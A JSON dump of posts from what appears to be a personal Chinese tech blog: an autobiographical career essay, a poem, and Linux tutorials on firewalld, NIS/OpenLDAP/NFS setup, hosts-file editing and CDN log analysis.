然后18岁读大学到了省城，眼界就被限制在省城里的某一个学校方圆几十里地，由于家庭原因，除了日常生活费已无剩余的闲钱去买其他东西或旅游什么的。 我读书那会基本没怎么看过课外书。课本都是学校发的。 大部分农村出来的学生应该和我都差不多。 农村的大部分父母基本都是自己没读过什么书，因此也别指望他们能给孩子做什么辅导和帮助了，他们能做的就是给你勉强交学费上个学，然后给你每月几百块的生活费，我记得读大学那会每月的生活费基本就是500-800。说实话这个钱在省城只能维持不至于挨饿。父母还说你花钱厉害，导致心里那种内疚感，就感觉对比起他们拿着他们辛苦挣的血汗钱，内心充满了自责。 高中毕业之后我独自一个人去市区找兼职，找了很久找到一份服务员的工作，700块钱一个月。那是08年。拿到自己第一次亲手努力挣的这笔钱很开心，但是，我发誓我这辈子不要去做这种给人端茶送水的工作。 上大学报到，我一个人到学校报到的，其他同学都是父母送，我记得当时到寝室，其他室友都是父母陪着过来的，我爸也说要送我，但是我觉得没必要，浪费钱！我觉得我自己有能力独立去做这件事。 大学期间暑假里我又自己跑去美的工厂兼职（面试的时候说是全职，不然工厂不要你），干了1个多月到开学，体验了一次工厂上班的生活，早上7点起床、7点半进入车间开始工作，到晚上7点半下班，一个月900块钱。工作的内容就是在流水线给冰箱装门，几乎没有任何休息时间。出来后，我发誓这辈子不要去工厂打工。 在学校期间，我主动去找学校的电子阅览室管理员寻求兼职，虽然我是学文科的，可是大学那会我的计算机基本技术应该是超越了班里其他任何同学的。因此我晚上下课就去阅览室做网管赚外快，300块钱一个月，另外自己也不断学技术。 因为各种原因，当时报的专业是个文科吧，到了大学自己就感觉这个工作毕业工作肯定是不好找的，事实就是如此，于是自学计算机，比如 Linux。 大学毕业后找了个4个人的小公司，1000块钱一个月，干了3个月，一开始做销售卖电脑、服务器，然后跳槽去58同城干了一天半电销，发现电销这个工作就是每天不停的给客户打电话，然后基本都是被拒绝或挂断电话的，第二天下午我就溜了，发了个短信给那个主管，我说我干不了。据了解当时他们销售最高的工资4000。合肥当时房价5000-7000。 然后又去卖苹果电脑，也是销售，天天在柜台喊着，欢迎光临“美承数码”，XXX，了解下 iPhone 新款”，然后要我不停的背产品说明和台词，一天就站着。感觉很没技术含量。工资1500一个月。 我还是觉得要做技术有前途，挣钱多（当时的想法）。于是继续找工做，找了个网络公司，做 IDC 的，让我去做运维，其实就是网管。因为我对 Linux 命令还是比较熟的，然后卖过服务器，所以面试通过，但是啊，在合肥这个地方，在我了解的这几个公司，没有一个给交保险的。进入这家单位我问了是否交保险，忽悠我说转正就交，结果到我走了也没见过保险长啥样。 因为合肥这边基本小单位都不交。 其实在这个公司干了一年多，我就觉得没意思了，工作重复性太高，没有挑战，工资也低，每天就是给客户装装操作系统，部署个服务什么的，那会云计算还不发达。机器都是运行在物理机上的，然后给用户安装 web 服务器搭建个网站什么的，我被分到常州这个地方，那会工资2500，包住不包吃。 我几次打电话回家告诉我妈想换工作，并希望继续学习，我妈和我姑姑说好好干不要老换工作，干的好老板自然给你涨工资，我说生活压力大，谈个女朋友，嫌弃我工资低，说跟着我没希望。我自己也觉得给不了他未来，遂分手。 家里总是说你要是找个包吃包住的工作就好了，还可以省比钱，是的，在他们眼里那班去工厂上班去工地上班的都是包住包吃的。这就是他们的见识！现在特后悔的事情就是当初为什么浪费 2 年时间呆那个破公司，没社保没保险的我居然能干下去，回想觉得还是见识不够广。另外就是胆子小，每个月的工资只够自己生活，不敢跳槽。 常州这个地方以及合肥这个地方，没什么特别好的工作机会的。工资特别低。在没离职之前也曾想过边上班边学习，但是那会在线教育还不发达，想转行，但是线下培训太贵，当时没报。主要还是穷！ 后来实在太压抑了，裸辞了，加上我弟弟车祸，整个人都不好，心情超级低落！觉得这样的人生不是我想要的，于是辞职来到了杭州。那是14年初，我的目标是一年之内让工资涨到5000，然而并没有，来杭州找的第一份工做 3500，扣社保公积金 3000 到手。我觉得不能再这样下去了，这样整个人生就废掉了，于是一边参加培训，学习CCIE，一边上班。顺便还把学到的东西用到了工作中，觉得这样的工作很有成就感。 不过因为在机房，辐射大，而且工作特别累，给阿里做机房网络建设。加上看了下网络工程师的招聘工资都太低。遂10月份裸辞去学编程。找我爸借了1万块钱加上自己的一点点积蓄分期付款学了4个月编程入门。 在15年初我换了个工作，达到了我自己的目标。 当达到这个目标后，我又给自己定下了目标，月薪过万。因为每个月扣除学编程和之前培训的花费，俨然工资是不够的，于是继续利用业余时间学习各种技术。同时在业余时间把自己所学的东西讲给其他人听，每个月除工资6000多，加上业余的讲课外快4000-5000 ，也达到了这个目标。并且把借我爸的钱给还了。 所以，我觉得人得有见识。有见识才知道自己要什么？ 虽然 10000 并不多，在这个一平米好几万的年代，但是自己努力达到了。且过程中成长了。关键是自己掌握了傍身的一技之长。未来的路可以走的更长更远。 我嫌现在工资低，我家里人还说知足吧，我爸说我要是有你这么高工资早乐呵呵了，你看，这就是他们的见识！ 13 年过年期间，我爸问我是把家里老房子重新装修下还是重新盖个，说是给我以后结婚的婚房，我说现在盖房子不划算，我想买房。家里房子盖了再好也是农村，家里交通又不发达，医疗也不行，我又常年不在家。花几十万盖个房子投入进去就是贬值的。原话我当时就是这么跟我爸说的，可是他们不听我的，还是在家里盖了3层。如果当时付个首付 20万的样子买了个房，现在卖了 最起码赚一倍多。就算卖了回老家买房子+自己宅基地盖房子也是狗了吧！","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"markdown的目录级别问题","slug":"markdown的目录级别问题","date":"2017-06-26T02:46:09.000Z","updated":"2021-02-26T06:05:29.278Z","comments":true,"path":"posts/2304335668.html","link":"","permalink":"https://awen.me/posts/2304335668.html","excerpt":"最近在使用 Markdown 写作的时候，发现目录级别总是不能被正确显示，后来看了 hexo 的 issue 后才发现我跨级了","text":"最近在使用 Markdown 写作的时候，发现目录级别总是不能被正确显示，后来看了 hexo 的 issue 后才发现我跨级了 什么是跨级跨级的意思就是说你使用# 一级标题后面不能直接跳过##二级标题使用### 三级标题，否则就会有问题，例如 # 这是一个一级标题 下面的内容都是测试内容 ## 这是一个二级标题 下面是二级标题的内容 #### 这是一个四级标题 四级标题内容 # 这是一个一级标题 则目录显示会是下面的情况 而要显示正常，则应该 这是一个一级标题下面的内容都是测试内容这是一个二级标题下面是二级标题的内容这是一个三级标题四级标题内容这是第二个一级标题","categories":[],"tags":[{"name":"markdown","slug":"markdown","permalink":"https://awen.me/tags/markdown/"}]},{"title":"荷花","slug":"荷花","date":"2017-06-25T13:23:38.000Z","updated":"2021-02-26T06:05:29.355Z","comments":true,"path":"posts/1492994191.html","link":"","permalink":"https://awen.me/posts/1492994191.html","excerpt":"红粉靓梳妆，翠盖低风雨。占断人间六月凉，期月鸳鸯浦。根底藕丝长，花里莲心苦。只为风流有许愁，更衬佳人步。","text":"红粉靓梳妆，翠盖低风雨。占断人间六月凉，期月鸳鸯浦。根底藕丝长，花里莲心苦。只为风流有许愁，更衬佳人步。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"firewalld基础","slug":"firewalld基础","date":"2017-06-25T03:16:39.000Z","updated":"2021-02-26T06:05:29.273Z","comments":true,"path":"posts/3305827175.html","link":"","permalink":"https://awen.me/posts/3305827175.html","excerpt":"在 centos 7以前，默认都是使用 iptables，而在7以后，防火墙默认使用 firewalld，相比较于 iptables firewalld 没有各种表，但是加入了区域的概念，不过，其实在底层，这2个应用层程序都依赖 netfilter 什么是 netfilerLinux内核包含一个强大的网络过滤子系统netfilter。netfilter子系统允许内核 模块对遍历系统的每个数据包进行检查。这表示在任何传入、传出或转发的网 络数据包到达用户空间中的组件之前，都可以通过变成方式检查、修改、丢弃 或拒绝这些数据包。","text":"在 centos 7以前，默认都是使用 iptables，而在7以后，防火墙默认使用 firewalld，相比较于 iptables firewalld 没有各种表，但是加入了区域的概念，不过，其实在底层，这2个应用层程序都依赖 netfilter 什么是 netfilerLinux内核包含一个强大的网络过滤子系统netfilter。netfilter子系统允许内核 模块对遍历系统的每个数据包进行检查。这表示在任何传入、传出或转发的网 络数据包到达用户空间中的组件之前，都可以通过变成方式检查、修改、丢弃 或拒绝这些数据包。 firewalld 简介Red Hat Enterprise Linux7中引入了一种与netfilter交互的新方法: firewalld。firewalld是一个可以配置和监控系统防火墙规则的系统守护进程。 应用可以通过Dbus消息系统与firewalld通信以请求打开端口，此功能可以禁 用或锁定。该守护进程不仅涵盖IPv4、IPv6，还可能涵盖ebtables设置。 firewalld守护进程从firewalld软件包安装。此软件包属于base安装的一部分， 但不属于minimal安装的一部分。firewalld将所有网络流量分为多个区域，从而简化防火墙管理。根据数据包 源IP地址或传入网络接口等条件，流量将转入相应区域的防火墙规则。每个 区域都可以具有自己的要打开或关闭的端口和服务列表。 filewalld 区域默认配置 区域名称 默认配置 trusted 允许有传入流量 home 除非与传入流量相关，或与 ssh、mdns、ipp-client、samba-client 或 dhcpv6-client 预定义服务匹配，否则拒绝传入流量 internal 除非与传出流量相关，或与ssh、mdns、ipp-client、samba-client或dhcpv6-client预 定义服务匹配，否则拒绝传入流量(一开始与home区域相同) work 除非与传出流量相关，或与ssh、ipp-client或dhcpv6-client预定义服务匹配，否则拒 绝传入流量。 public 除非与传出流量相关，uoyussh或dhcpv6-client预定义服务匹配，否则拒绝传入流量 新添加的网络接口的默认区域。 external 除非与传出流量相关，或与ssh预定义服务匹配，否则拒绝传入流量。通过此区域 转发的IPv4传出流量将进行伪装，以使其看起来像是来自传出网络接口的IPv4地址。 dmz 除非与传出流量相关，或与ssh预定义服务匹配，否则拒绝传入流量。 block 除非与传出流量相关，否则拒绝所有传入流量。 drop 除非与传出流量相关，否则丢弃所有传入流量(甚至不产生包含ICMP错误的响 应)。 包[root@server ~]# rpm -qa | grep firewall firewalld-0.4.3.2-8.1.el7_3.3.noarch firewalld-filesystem-0.4.3.2-8.1.el7_3.3.noarch python-firewall-0.4.3.2-8.1.el7_3.3.noarch图形化图形化需要安装 config，最小化安装不会安装 [root@client ~]# yum -y install firewall-config 通常我们不在图形化界面进行设置，所以不过多讨论图形化界面的使用 进程[root@client ~]# systemctl status firewalld.service [root@client ~]# systemctl stop firewalld.service [root@client ~]# systemctl restart firewalld.service","categories":[],"tags":[{"name":"firewalld","slug":"firewalld","permalink":"https://awen.me/tags/firewalld/"}]},{"title":"Centos7使用nis和ladp","slug":"Centos7使用nis和ladp","date":"2017-06-25T01:15:56.000Z","updated":"2021-02-26T06:05:29.243Z","comments":true,"path":"posts/1828507451.html","link":"","permalink":"https://awen.me/posts/1828507451.html","excerpt":"安装和配置服务端1.安装 yum -y install ypserv启动","text":"安装和配置服务端1.安装 yum -y install ypserv启动 [root@server ~]# systemctl enable ypserv Created symlink from /etc/systemd/system/multi-user.target.wants/ypserv.service to /usr/lib/systemd/system/ypserv.service. [root@server ~]# systemctl restart ypserv [root@server ~]# systemctl status ypserv ● ypserv.service - NIS/YP (Network Information Service) Server Loaded: loaded (/usr/lib/systemd/system/ypserv.service; enabled; vendor preset: disabled) Active: active (running) since Sat 2017-05-20 09:41:30 CST; 9s ago Main PID: 3298 (ypserv) Status: &quot;Processing requests...&quot; CGroup: /system.slice/ypserv.service └─3298 /usr/sbin/ypserv -f May 20 09:41:30 server systemd[1]: Starting NIS/YP (Network Information Service) Server... May 20 09:41:30 server ypserv[3298]: WARNING: no securenets file found! May 20 09:41:30 server systemd[1]: Started NIS/YP (Network Information Service) Server. [root@server ~]# 2.设置NIS名称 [root@server ~]# nisdomainname rhce [root@server ~]# nisdomainname rhce3.构建数据库 创建一个用户 u1 构建数据库 [root@server ~]# /usr/lib64/yp/ create_printcap match_printcap pwupdate yphelper ypxfr ypxfr_1perhour makedbm mknetid revnetgroup ypinit ypxfr_1perday ypxfr_2perday [root@server ~]# /usr/lib64/yp/ypinit -m At this point, we have to construct a list of the hosts which will run NIS servers. server is in the list of NIS server hosts. Please continue to add the names for the other hosts, one per line. When you are done with the list, type a &lt;control D&gt;. next host to add: server next host to add: 到这里按 ctrl+d [root@server ~]# /usr/lib64/yp/ypinit -m At this point, we have to construct a list of the hosts which will run NIS servers. server is in the list of NIS server hosts. Please continue to add the names for the other hosts, one per line. When you are done with the list, type a &lt;control D&gt;. next host to add: server next host to add: The current list of NIS servers looks like this: server Is this correct? [y/n: y] y We need a few minutes to build the databases... Building /var/yp/rhce/ypservers... Running /var/yp/Makefile... gmake[1]: Entering directory `/var/yp/rhce&apos; Updating passwd.byname... Updating passwd.byuid... Updating group.byname... Updating group.bygid... Updating hosts.byname... Updating hosts.byaddr... Updating rpc.byname... Updating rpc.bynumber... Updating services.byname... Updating services.byservicename... Updating netid.byname... Updating protocols.bynumber... Updating protocols.byname... Updating mail.aliases... gmake[1]: Leaving directory `/var/yp/rhce&apos; server has been set up as a NIS master server. Now you can run ypinit -s server on all slave server. [root@server ~]# 设置客户端1.编辑配置文件 [root@client ~]# vim /etc/nsswitch.conf 增加如下内容 passwd: files nis sss shadow: files nis sss group: files nis sss hosts: files nis dns myhostname2.安装 ypbind [root@client ~]# yum -y install ypbind3.配置 [root@client ~]# authconfig-tui 4.登陆 [root@client ~]# su - u1 Last login: Sat May 20 10:39:56 CST 2017 on pts/0 su: warning: cannot change directory to /home/u1: No such file or directory -bash-4.2$ 配置 nfs1.nfs 服务端配置 略。。。 2.客户端挂载 [root@client home]# mount -t nfs 172.10.100.129:/home /home [root@client home]# su - u1 Last login: Sat May 20 10:53:07 CST 2017 on pts/1 [u1@client ~]$ touch 1 [u1@client ~]$ openldap 安装yum install openldap openldap-clients openldap-servers migrationtools配置文件 cd /etc/openldap/slapd.d拷贝配置文件到 home 目录 cp /usr/share/openldap-servers/slapd.ldif /home/修改 dc=my-doamin 为你的域名 130 dn: olcDatabase=monitor,cn=config 131 objectClass: olcDatabaseConfig 132 olcDatabase: monitor 133 olcAccess: to * by dn.base=&quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external,c 134 n=auth&quot; read by dn.base=&quot;cn=Manager,dc=abc,dc=com&quot; read by * none 135 136 # 137 # Backend database definitions 138 # 139 140 dn: olcDatabase=hdb,cn=config 141 objectClass: olcDatabaseConfig 142 objectClass: olcHdbConfig 143 olcDatabase: hdb 144 olcSuffix: dc=abc,dc=com 145 olcRootDN: cn=Manager,dc=abc,dc=com 146 olcDbDirectory: /var/lib/ldap 147 olcDbIndex: objectClass eq,pres 148 olcDbIndex: ou,cn,mail,surname,givenname eq,pres,sub设置一个秘密 [root@server home]# slappasswd New password: Re-enter new password: {SSHA}6ZV4bJxlj6a0CPsqAwaXdS+AjPmSZ9Do把密码假如到配置文件 olcRootDN: cn=Manager,dc=abc,dc=com olcRootPW: {SSHA}6ZV4bJxlj6a0CPsqAwaXdS+AjPmSZ9Do #增加一行PW:后注意是 tab 键盘 不要留空格增加内容 1.主要文件是在 sehema 目录下 [root@server schema]# ll -d /etc/openldap/schema/* |awk -F&quot; &quot; &apos;{print $9}&apos; /etc/openldap/schema/collective.ldif /etc/openldap/schema/collective.schema /etc/openldap/schema/corba.ldif /etc/openldap/schema/corba.schema /etc/openldap/schema/core.ldif /etc/openldap/schema/core.schema /etc/openldap/schema/cosine.ldif /etc/openldap/schema/cosine.schema /etc/openldap/schema/duaconf.ldif /etc/openldap/schema/duaconf.schema /etc/openldap/schema/dyngroup.ldif /etc/openldap/schema/dyngroup.schema /etc/openldap/schema/inetorgperson.ldif /etc/openldap/schema/inetorgperson.schema /etc/openldap/schema/java.ldif /etc/openldap/schema/java.schema /etc/openldap/schema/misc.ldif /etc/openldap/schema/misc.schema /etc/openldap/schema/nis.ldif /etc/openldap/schema/nis.schema /etc/openldap/schema/openldap.ldif /etc/openldap/schema/openldap.schema /etc/openldap/schema/pmi.ldif /etc/openldap/schema/pmi.schema /etc/openldap/schema/ppolicy.ldif /etc/openldap/schema/ppolicy.schema /etc/openldap/schema/samba.schema插入到配置文件 include: file:///etc/openldap/schema/core.ldif include: file:///etc/openldap/schema/collective.ldif include: file:///etc/openldap/schema/collective.schema include: file:///etc/openldap/schema/corba.ldif include: file:///etc/openldap/schema/corba.schema include: file:///etc/openldap/schema/core.ldif include: file:///etc/openldap/schema/core.schema include: file:///etc/openldap/schema/cosine.ldif include: file:///etc/openldap/schema/cosine.schema include: file:///etc/openldap/schema/duaconf.ldif include: file:///etc/openldap/schema/duaconf.schema include: file:///etc/openldap/schema/dyngroup.ldif include: file:///etc/openldap/schema/dyngroup.schema include: file:///etc/openldap/schema/inetorgperson.ldif include: file:///etc/openldap/schema/inetorgperson.schema include: file:///etc/openldap/schema/java.ldif include: file:///etc/openldap/schema/java.schema include: file:///etc/openldap/schema/misc.ldif include: file:///etc/openldap/schema/misc.schema include: file:///etc/openldap/schema/nis.ldif include: file:///etc/openldap/schema/nis.schema include: file:///etc/openldap/schema/openldap.ldif include: file:///etc/openldap/schema/openldap.schema include: file:///etc/openldap/schema/pmi.ldif include: file:///etc/openldap/schema/pmi.schema include: file:///etc/openldap/schema/ppolicy.ldif include: file:///etc/openldap/schema/ppolicy.schema include: file:///etc/openldap/schema/samba.schema在文末增加 dn: olcDatabase=config,cn=config objectClass: olcDatabaseConfig olcDatabase: config olcAccess: to * by dn.base=&quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth&quot; manage by * none删除原有的配置 [root@server ~]# rm -rf /etc/openldap/slapd.d/*将 home 目录的slapd.ldif 加载进配置文件目录中 [root@server home]# slapadd -F /etc/openldap/slapd.d/ -n 0 -l /home/slapd.ldif 591fd54d str2entry: entry -1 has no dn slapadd: could not parse entry (line=724) _################### 99.70% eta none elapsed none spd 3.3 M/s Closing DB... -l:说明了包含要增加的条目的文本格式的LDIF输入文件 -f:说明了slapd配置文件的格式。该配置文件说明了在何处创建索引，以及创建什么索引等等 -n:说明修改那一个数据库的可选参数 测试文件是否正确 [root@server home]# slaptest -u -F /etc/openldap/slapd.d/ config file testing succeeded若正确则提示： config file testing succeeded修改配置文件的所有者，否则无法读取这些配置： chown -Rv ldap.ldap /etc/openldap/slapd.d如下 [root@server slapd.d]# chown -Rv ldap.ldap /etc/openldap/slapd.d/ changed ownership of ‘/etc/openldap/slapd.d/cn=config.ldif’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config/cn=schema.ldif’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config/cn=schema/cn={0}core.ldif’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config/cn=schema/cn={1}collective.ldif’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config/cn=schema’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config’ from root:root to ldap:ldap ownership of ‘/etc/openldap/slapd.d/’ retained as ldap:ldap确认下所有者和所属组 [root@server slapd.d]# ll total 4 drwxr-x--- 3 ldap ldap 45 May 20 13:34 cn=config -rw------- 1 ldap ldap 589 May 20 13:34 cn=config.ldif创建数据库配置文件 [root@server slapd.d]# cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG [root@server slapd.d]# chown -Rv ldap.ldap /var/lib/ldap/DB_CONFIG changed ownership of ‘/var/lib/ldap/DB_CONFIG’ from root:root to ldap:ldap启动服务 [root@server ~]# systemctl start slapd.service [root@server ~]# systemctl status slapd.service ● slapd.service - OpenLDAP Server Daemon Loaded: loaded (/usr/lib/systemd/system/slapd.service; disabled; vendor preset: disabled) Active: active (running) since Sat 2017-05-20 13:44:56 CST; 7s ago Docs: man:slapd man:slapd-config man:slapd-hdb man:slapd-mdb file:///usr/share/doc/openldap-servers/guide.html Process: 10099 ExecStart=/usr/sbin/slapd -u ldap -h ${SLAPD_URLS} $SLAPD_OPTIONS (code=exited, status=0/SUCCESS) Process: 10082 ExecStartPre=/usr/libexec/openldap/check-config.sh (code=exited, status=0/SUCCESS) Main PID: 10102 (slapd) CGroup: /system.slice/slapd.service └─10102 /usr/sbin/slapd -u ldap -h ldapi:/// ldap:/// May 20 13:44:54 server systemd[1]: Starting OpenLDAP Server Daemon... May 20 13:44:54 server runuser[10087]: pam_unix(runuser:session): session opened for user ldap by (uid=0) May 20 13:44:54 server slapcat[10093]: DIGEST-MD5 common mech free May 20 13:44:55 server slapd[10099]: @(#) $OpenLDAP: slapd 2.4.40 (Nov 6 2016 01:21:28) $ mockbuild@worker1.bsys.centos.org:/builddir/build/BUILD/openld...slapd May 20 13:44:56 server slapd[10102]: slapd starting May 20 13:44:56 server systemd[1]: Started OpenLDAP Server Daemon. Hint: Some lines were ellipsized, use -l to show in full. [root@server ~]# systemctl enable slapd.service Created symlink from /etc/systemd/system/multi-user.target.wants/slapd.service to /usr/lib/systemd/system/slapd.service.创建多个用户 [root@server ~]# ./create_user.sh mkdir: created directory ‘/home/ldapuser’ Changing password for user lduser1. passwd: all authentication tokens updated successfully. Changing password for user lduser2. passwd: all authentication tokens updated successfully. Changing password for user lduser3. passwd: all authentication tokens updated successfully. Changing password for user lduser4. passwd: all authentication tokens updated successfully. Changing password for user lduser5. passwd: all authentication tokens updated successfully. Changing password for user lduser6. passwd: all authentication tokens updated successfully.附脚本内容 [root@server ~]# cat create_user.sh #!/bin/bash USER_LIST=ldapuser.txt HOME_ldap=/home/ldapuser mkdir -pv $HOME_ldap for USERID in `awk &apos;{print $1}&apos; $USER_LIST`; do USERNAME=&quot;`grep &quot;$USERID&quot; $USER_LIST | awk &apos;{print $2}&apos;`&quot; HOMEDIR=${HOME_ldap}/${USERNAME} useradd $USERNAME -u $USERID -d $HOMEDIR grep &quot;$USERID&quot; $USER_LIST | awk &apos;{print $3}&apos; | passwd --stdin $USERNAME done [root@server ~]# cat ldapuser.txt 5000 lduser1 123456 5001 lduser2 123456 5002 lduser3 123456 5003 lduser4 123456 5004 lduser5 123456 5005 lduser6 123456 [root@server ~]#修改/usr/share/migrationtools/migrate_common.ph文件 vim /usr/share/migrationtools/migrate_common.ph # Default DNS domain $DEFAULT_MAIL_DOMAIN = &quot;abc.com&quot;; # Default base $DEFAULT_BASE = &quot;dc=abc,dc=com&quot;;创建基本的数据库模板文件 [root@server ~]# /usr/share/migrationtools/migrate_base.pl &gt; /root/base.ldif 创建用户的数据库模板文件 /usr/share/migrationtools/migrate_passwd.pl /etc/passwd /root/user.ldif编辑vim /root/user.ldif，只留下LDAP用户的相关信息，删掉其他用户信息。 user.ldif中所有的DN都是属于People这个OU，而People这个OU是在base.ldif中定义的。user.ldif中所有的DN都是继承自以下4个类：objectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: shadowAccount其中posixAccount和shadowAccount提供了uidNumber、gidNumber、homeDirectory、loginShell、userPassword这些属性 创建组数据库信息 /usr/share/migrationtools/migrate_group.pl /etc/group /root/group.ldif编辑group.ldif，只留LDAP用户相关的组的信息，删掉其他用户信息。user.ldif中所有的DN都是属于Group这个OU，而Group这个OU是在base.ldif中定义的。 使用 ldapadd 导入数据库 在ldappadd命令中常用的选项如下：-x：进行简单认证。-D：用来绑定服务器的dn。-h：目录服务的地址。-w：绑定dn的密码。-f：使用LDIF文件进行条目添加的文件。 [root@server ~]# ldapadd -D &quot;cn=Manager,dc=abc,dc=com&quot; -W -x -f base.ldif Enter LDAP Password: ldap_bind: Invalid credentials (49) [root@server ~]# ldapadd -D &quot;cn=Manager,dc=abc,dc=com&quot; -W -x -f user.ldif Enter LDAP Password: ldap_bind: Invalid credentials (49) [root@server ~]# ldapadd -D &quot;cn=Manager,dc=abc,dc=com&quot; -W -x -f group.ldif Enter LDAP Password: ldap_bind: Invalid credentials (49)配置 nfs[root@server ~]# vim /etc/exports [root@server ~]# cat /etc/exports /home/remoteuser *(rw)启动服务 [root@server ~]# systemctl start rpcbind.service [root@server ~]# systemctl start nfs-server.service查看端口 [root@server ~]# ss -ant| grep 389 LISTEN 0 128 *:389 *:* LISTEN 0 128 :::389 :::* [root@server ~]# ss -ant| grep 2049 LISTEN 0 64 *:2049 *:* LISTEN 0 64 :::2049 :::*设置为开机启动 [root@server ~]# systemctl enable rpcbind.service [root@server ~]# systemctl enable nfs-server.service 配置日志配置日志 编辑rsyslog配置文件： vi /etc/rsyslog.conf加上一行: local4.* /var/log/ldap.log 然后 touch /var/log/ldap.log重启rsyslog： systemctl restart rsyslog.service如果slapd启动出问题，可查看/var/log/messages文件，比如： systemctl status slapd.service -l tail -n20 -f /var/log/messages服务器配置到此结束。 ###客户端配置 配置LDAP客户端1.安装LDAP认证相关软件包 yum -y install sssd-ldap nss-pam-ldapd2.开启LDAP验sl证终端执行命令authconfig-tui","categories":[],"tags":[{"name":"ladp","slug":"ladp","permalink":"https://awen.me/tags/ladp/"}]},{"title":"如何绑定hosts","slug":"如何绑定hosts","date":"2017-06-24T08:59:14.000Z","updated":"2021-02-26T06:05:29.330Z","comments":true,"path":"posts/3548068394.html","link":"","permalink":"https://awen.me/posts/3548068394.html","excerpt":"通常我们要访问某个网站或者请求某个域名都是需要进行域名解析的，比如我们要访问www.baidu.com，首先客户端(浏览器)会向 DNS 服务器发起查询然后得到服务器的 IP,从而访问到服务器的资源。但是有时候，服务器解析发生了变化，比如IP 地址从1.1.1.1变成了2.2.2.2，这个时候由于 DNS 的数据库存在缓存，需要更新后才能把新的 IP 地址添加到 DNS 记录中。但是在 DNS更新数据库的时候，有可能还是会请求到旧的 IP 地址，从而造成无法访问的问题，这个时候，我们就可以通过修改本地 hosts 文件来进行访问。","text":"通常我们要访问某个网站或者请求某个域名都是需要进行域名解析的，比如我们要访问www.baidu.com，首先客户端(浏览器)会向 DNS 服务器发起查询然后得到服务器的 IP,从而访问到服务器的资源。但是有时候，服务器解析发生了变化，比如IP 地址从1.1.1.1变成了2.2.2.2，这个时候由于 DNS 的数据库存在缓存，需要更新后才能把新的 IP 地址添加到 DNS 记录中。但是在 DNS更新数据库的时候，有可能还是会请求到旧的 IP 地址，从而造成无法访问的问题，这个时候，我们就可以通过修改本地 hosts 文件来进行访问。 通常，本地发起网络请求，优先查询 hosts 文件，如果 hosts 文件没有记录，才会去查询 DNS 服务器。 windows如何修改1.对于 Windows 用户，我们可以打开C:\\Windows\\System32\\drivers\\etc目录，在这个目录有一个 hosts 文件 但是默认情况下我们是没有权限修改他的，默认这个文件只有只读权限，我们需要修改他的权限，让当前的用户对其有读写权限，右键选择属性–切换到安全，然后点击编辑，找到你当前使用的用户名通常是 User(xxx/xxx), 然后授权用户拥有读写执行权限，如果你不懂，直接勾选完全控制好了 然后弹出对话框，直接点击是，然后右键选择打开方式，选择记事本打开 然后添加记录格式如下，然后保存 [ip] v0.api.upyun.com比如 121.42.148.6 v0.api.upyun.com 如图所示 这里的 ip，可以找又拍云提供，绑定好以后，进行测试 win7用户可以打开开始菜单，输入 cmd 打开命令提示符win8以上用户可以按 win+x 键，找到运行 然后输入 cmd 然后输入 ping v0.api.upyun.com 验证IP是否是刚才写在 hosts 文件中的。 linux or mac如果你是 mac 或 linux 用户，相信你应该可以自行解决。本教程只针对非专业用户。如果实在不会 sudo vim /etc/hosts 在这个文件末尾添加","categories":[],"tags":[{"name":"hosts","slug":"hosts","permalink":"https://awen.me/tags/hosts/"}]},{"title":"又拍云日志系统简介","slug":"记录如何处理CDN被重复IP频繁刷流量","date":"2017-06-24T05:15:45.000Z","updated":"2021-02-26T06:05:29.357Z","comments":true,"path":"posts/2620878075.html","link":"","permalink":"https://awen.me/posts/2620878075.html","excerpt":"又拍云提示了日志分析和日志下载功能，通过后台可以根据需求查询访问最多的 IP 或 URL，以此设置一些策略，达到限制重复 IP 访问的效果","text":"又拍云提示了日志分析和日志下载功能，通过后台可以根据需求查询访问最多的 IP 或 URL，以此设置一些策略，达到限制重复 IP 访问的效果 后台功能简介后台点击工具箱–日志管理 可以看到全网加速和直播加速日志，切换到日志分析，可以选择对应的服务名和域名，然后按类型进行划分并且选择日志进行查询 热门引用页面 热门文件 热门客户端 热门 IP 文件大小 资源状态 比如，我们希望看下2017-06-23哪个 IP 访问次数最多。可以选择热门 IP 进行查询。如果同一个 IP 请求特别多，可以在防盗链中将对于的Ip 进行限制或者加入黑名单 此外，还可以下载日志到本地进行分析，又拍云的日志是一小时一出，比如1点到2点之间的日志，会在2点半左右更新在后台。 下载日志 比如我们将23号一天的日志全部下载到本地，然后将日志文件合并为一个文件 ➜ Downloads cat *.gz &gt;&gt; awen.gz ➜ Downloads ll awen.gz -rw-r--r-- 1 wenjun staff 15K 6 24 13:26 awen.gz然后解压 ➜ Downloads gunzip awen.gz ➜ Downloads ll awen -rw-r--r-- 1 wenjun staff 170K 6 24 13:26 awen然后查看日志 日志字段含义66.249.66.11 - - [23/Jun/2017:00:50:08 +0800] &quot;GET https://file.awen.me/2017-06-16-091922.jpg!awen) HTTP/1.1&quot; 200 64922 &quot;-&quot; &quot;Googlebot-Image/1.0&quot; &quot;image/jpeg&quot; 0 Miss &quot;C/200&quot; Static &quot;max-age=1296000&quot; 1.901 204.237.206.134从左到右分别是 客户端 IP: 66.249.66.11 空 空 请求时间: [23/Jun/2017:00:50:08 +0800] 请求方法： GET 请求的 URL：https://file.awen.me/2017-06-16-091922.jpg!awen) 状态码：200 请求的字节：64922 User-agent：Googlebot-Image/1.0” 文件类型:”image/jpeg” 0 0 表示客户端向服务器发起请求的内容大小 是否缓存命中 CDN Miss 表示未命中 C/200 表示回源站响应200，如果是 U/200 则表示又拍云存储类型，如果你是自主源站，显示为 U，则是开启了镜像功能，文件被存储在 CDN Static 表示静态请求 “max-age=1296000” 缓存控制头信息 节点请求耗时：1.901 CDN 节点：204.237.206.134 日志格式 $remote_addr - $remote_user [$time_local] &quot;$request_method $scheme://$http_host$uri$querystring $server_protocol&quot; $status 